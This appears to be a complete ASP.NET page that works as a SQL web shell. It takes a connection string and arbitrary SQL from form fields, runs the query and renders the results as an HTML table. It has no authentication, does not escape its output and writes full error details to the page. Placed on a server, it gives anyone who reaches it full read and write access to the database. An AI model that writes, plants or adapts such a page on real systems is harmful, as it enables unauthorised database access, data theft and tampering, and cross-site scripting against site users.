<%@ Page Language="C#" %>
<%@ Import namespace="System.Data"%>
<%@ Import namespace="System.Data.SqlClient"%>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">
    protected void btnExecute_Click(object sender, EventArgs e)
    {
        SqlConnection sqlConnection = null;

        try
        {
            sqlConnection = new SqlConnection();
            
            sqlConnection.ConnectionString = txtConnection.Text;
            sqlConnection.Open();

            SqlCommand sqlCommand = null;
            SqlDataReader sqlDataReader = null;

            sqlCommand = new SqlCommand(txtSql.Text, sqlConnection);
            sqlCommand.CommandType = CommandType.Text;

            sqlDataReader = sqlCommand.ExecuteReader();

            StringBuilder output = new StringBuilder();

            output.Append("<table width=\"100%\" border=\"1\">");

            while (sqlDataReader.Read())
            {
                output.Append("<tr>");

                int colCount = sqlDataReader.FieldCount;

                for (int index = 0; index < colCount; index++)
                {
                    output.Append("<td>");
                    output.Append(sqlDataReader[index].ToString());
                    output.Append("</td>");
                }

                output.Append("</tr>");

                output.Append(Environment.NewLine);
            }

            output.Append("</table>");

            Literal1.Text = output.ToString();

        }
        catch (SqlException sqlEx)
        {
            Response.Write(sqlEx.ToString());
        }
        catch (Exception ex)
        {
            Response.Write(ex.ToString());
        }
        finally
        {
            if (sqlConnection != null)
            {
                sqlConnection.Dispose();
            }
        }
    }
</script>

<html xmlns="http://www.w3.org/1999/xhtml" >
<head id="Head1" runat="server">
    <title>SQL</title>
<style type="text/css"><!--body,table,p,pre,form input,form select {font-family: "Lucida Console", monospace; font-size: 88%;}--></style>
</head>
<body>
    <form id="formSql" runat="server">
    <div>
        <table width="100%">
            <tr><td><asp:TextBox ID="txtConnection" runat="server" Height="15px" Width="100%"></asp:TextBox></td>
            </tr>
            <tr><td><asp:TextBox ID="txtSql" runat="server" Height="258px" Width="100%"></asp:TextBox></td>
            </tr>
            <tr><td><asp:Button ID="btnExecute" runat="server" OnClick="btnExecute_Click" Text="Execute" /></td>
            </tr>
            <tr><td>
                <asp:Literal ID="Literal1" runat="server"></asp:Literal></td>
            </tr>
        </table>
    </div>
    </form>
</body>
</html>
